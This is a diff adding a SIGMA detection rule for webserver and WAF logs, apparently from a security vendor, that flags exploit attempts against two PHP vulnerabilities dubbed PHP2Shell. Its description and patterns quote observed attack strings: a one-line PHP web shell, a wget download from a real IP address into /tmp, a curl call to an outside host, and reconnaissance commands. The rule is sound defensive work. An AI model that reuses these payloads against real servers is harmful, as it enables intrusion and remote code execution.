@@ -1,0 +1,82 @@
+# =====================================================================
+# IONSEC php2shell detector — SIGMA / webserver + WAF logs (execution canaries)
+# CVE-2026-109618 + CVE-2026-109619 — weaponized payload markers
+# =====================================================================
+title: PHP2Shell Weaponized Payload Execution Canaries (CVE-2026-109618 / CVE-2026-109619)
+id: 83e528e5-074b-57af-849e-9616fad40bdd
+status: experimental
+description: |
+    Detects command/execution canaries embedded in PHP2Shell weaponized
+    payloads, in request bodies landing in WAF/IDS logs, or echoed back in
+    proxied responses. Every string is copied EXACTLY as published:
+
+      - "uname -a; id; echo JACKALPOC" — ELLIO: "the public proof of
+        concept's default command uname -a; id; echo JACKALPOC, whose marker
+        JACKALPOC means it was run unmodified" (appears 149x in ELLIO's 20:33
+        capture, once per 288-byte part). Also listed by KELA ("JACKALPOC /
+        uid= strings in HTTP responses").
+      - "PWNED::" and "<?php echo 'PWNED::'; system($_GET['c']); ?>" —
+        VulnCheck: "Web shell planted via PHP_SESSION_UPLOAD_PROGRESS ...
+        PWNED:: in any response means it ran" (221.14.159.134, 17:22-17:24 UTC 21 Oct)
+      - "system(base64_decode(" + "echo PHP2SHELL_OK; id; whoami" — ELLIO
+        (45.136.71.89, same shape as the P2SMARK/P2SMK scanners with a command
+        in the progress field instead)
+      - "php2shell_out_start" / "php2shell_out_end" — F5 appendix UAs embedding
+        live PHP: "php2shellLP<?php echo 'php2shell_out_start';system('id');
+        echo 'php2shell_out_end';?>" and an id-exfil variant; F5-style
+        response-echo pattern
+      - "echo PHP2SHELL_CONFIRMED;cd /tmp; wget hxxp://92.118.112[.]100/nfs-setup"
+        — Arctic Wolf observed command sequence ("appeared repeatedly across
+        padded form fields"). The published string is defanged; the wire form
+        of the URL is http://92.118.112.100/nfs-setup — matched here via the
+        unambiguous non-URL substrings ('echo PHP2SHELL_CONFIRMED' and
+        '/nfs-setup') and the defang-uncloaked URL as published.
+      - "system('curl http://15.235.206.16:8443')" — ELLIO: progress-field
+        value, "a call with no second stage behind it"
+
+    A body hit = in-flight exploit attempt; a RESPONSE hit = near-certain
+    successful execution on the worker (treat as confirmed compromise).
+references:
+    - https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/
+    - https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/
+    - https://www.vulncheck.com/blog/php2shell-vulnerabilities
+    - https://www.f5.com/labs/articles/php2shell-exploitation-attempts-observed
+    - https://www.kelacyber.com/blog/php2shell-underground-response/
+author: IONSEC
+date: 2026-10-23
+modified: 2026-10-23
+tags:
+    - attack.execution
+    - attack.t1059.004
+    - attack.command-and-control
+    - attack.t1105
+    - cve.2026-109618
+    - cve.2026-109619
+logsource:
+    category: proxy
+detection:
+    sel_body_canaries:
+        request_body|contains:
+            - 'uname -a; id; echo JACKALPOC'
+            - 'JACKALPOC'
+            - 'system(base64_decode('
+            - 'echo PHP2SHELL_OK; id; whoami'
+            - 'PWNED::'
+            - 'php2shell_out_start'
+            - 'php2shell_out_end'
+            - 'echo PHP2SHELL_CONFIRMED'
+            - '/nfs-setup'
+            - 'http://92.118.112.100/nfs'
+            - 'http://92.118.112.100/nfs-setup'
+            - 'system(''curl http://15.235.206.16:8443'')'
+    sel_response_canaries:
+        response_body|contains:
+            - 'PWNED::'
+            - 'JACKALPOC'
+            - 'php2shell_out_start'
+            - 'PHP2SHELL_OK'
+    condition: 1 of sel_*
+falsepositives:
+    - 'JACKALPOC/PWNED::/PHP2SHELL_OK are low-collision unique canaries; short tokens (PWNED::) could appear in joke pages or CTF fixtures'
+    - 'Security tooling re-publishing these strings for detection testing'
+level: critical
